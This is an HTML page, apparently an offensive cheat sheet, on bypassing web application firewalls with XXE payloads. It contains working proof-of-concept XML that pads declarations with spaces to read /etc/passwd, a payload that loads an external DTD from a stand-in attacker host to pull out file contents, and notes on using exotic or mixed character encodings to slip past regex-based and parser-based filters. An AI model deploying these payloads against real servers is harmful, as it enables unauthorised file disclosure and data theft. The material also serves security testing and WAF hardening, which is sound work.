<title>Bypass Defenses</title>
</head><body>For the worst WAFs out there, replacing 'SYSTEM' by 'PUBLIC "x" ' can also do the trick, the two syntaxes are functionally the same.<br/>
<br/>
<br/>
two types of WAF based on how they handle XML validation:<br/>
<ul><li>Diligent. WAFs that pre-process the XML document with its own parser.</li>
<li>Regex-based. WAFs that only search for certain substrings or regular expressions in the data.</li>
</ul>
&nbsp;<br/>
<b>Extra spaces in the document</b><br/>
Since XXE are typically in the beginning of the XML document, a lazy WAF can avoid processing the entire document, and only parse its beginning. However, the XML format allows using an arbitrary number of spaces when formatting the tag attributes, so an attacker can insert extra spaces in &lt;?xml?&gt; or &lt;!DOCTYPE&gt; to bypass such WAFs.<br/>
<br/>
PoC:<br/>
&lt;?xml [ . . . 100500 spaces . . . ] version="1.0"&gt;<br/>
&lt;!DOCTYPE msg [&lt;!ELEMENT msg ANY&gt;&lt;!ENTITY attack SYSTEM "file:///etc/passwd"&gt;]&gt;<br/>
&lt;msg&gt;&amp;attack;&lt;/msg&gt;<br/>
<br/>
<b>Invalid format</b><br/>
To bypass diligent WAFs, an attacker may send specially formatted XML documents so that a WAF would consider them invalid.<br/>
<br/>
<b>Links to unknown entities</b><br/>
The settings of a diligent WAF usually prevent it from reading the contents of the linked files. This is strategy generally makes sense since otherwise, the WAF itself may also become a target of an attack. The problem is that the links to external sources can exist not only in the third part of the document (the body) but also in the declaration — &lt;! DOCTYPE&gt;. This means that a WAF, which has not read the contents of the file, will not read the declarations of the entity present in the document. The links to unknown entities, in turn, will stop the XML parser causing an error.<br/>
<br/>
PoC:<br/>
&lt;?xml version="1.0" encoding="UTF-8"?&gt;<br/>
&lt;!DOCTYPE msg [&lt;!ENTITY % load SYSTEM "http://&lt;attacker&gt;/look.dtd"&gt;%load;]&gt;<br/>
&lt;msg&gt;&amp;attack;&lt;/msg&gt;<br/>
<br/>
look.dtd:<br/>
&lt;!ENTITY % start "&lt;![CDATA["&gt;<br/>
&lt;!ENTITY % stuff SYSteM "File:///etc/passwd"&gt;<br/>
&lt;!ENTITY % end "]]&gt;"&gt;<br/>
&lt;!ENTITY attack "%start;%stuff;%end;"&gt;<br/>
<br/>
<b>Exotic encodings</b><br/>
An XML document can be encoded not only in UTF-8, but also in UTF-16 (two variants — BE and LE), in UTF-32 (four variants — BE, LE, 2143, 3412), and in EBCDIC.<br/>
<br/>
With the help of such encodings it is easy to bypass a WAF using regular expressions since, in this type of WAFs, regular expressions are often configured only for a one-character set.<br/>
<br/>
Exotic encodings may also be used to bypass diligent WAFs as they are not always able to process all the encodings listed above. For instance, the libxml2 parser only supports one type of UTF-32 — UTF-32BE, specifically without byte order mark (BOM).<br/>
<br/>
Two types of encoding in one document<br/>
what happens when there is a &lt;?xml?&gt; tag containing the encoding attribute referring to a different character set at the beginning of the document? In this case, some parsers change the encoding so that the beginning of the file has one set of characters, and the rest of it is in another encoding. That said, different parsers may switch the encoding at different times. A Java parser (javax.xml.parsers) changes the character set strictly after the &lt;?xml?&gt; ends, whereas the libxml2 parser may switch the encoding right after the value of the “encoding” attribute is executed or later — before or after the &lt;?xml?&gt; has been processed.<br/>
<br/>
A diligent WAF can protect against the attacks in such documents reliably only if it never processes them at all. We must also bear in mind that there are many synonymical encodings, for example, UTF-32BE and UCS-4BE. Moreover, some encodings may be different but compatible from the point of view of coding the initial part of the document — &lt;?xml?&gt;. For instance, a seemingly UTF-8 document may contain the string &lt;?xml version=”1.0” encoding=”windows-1251”?&gt;.<br/>
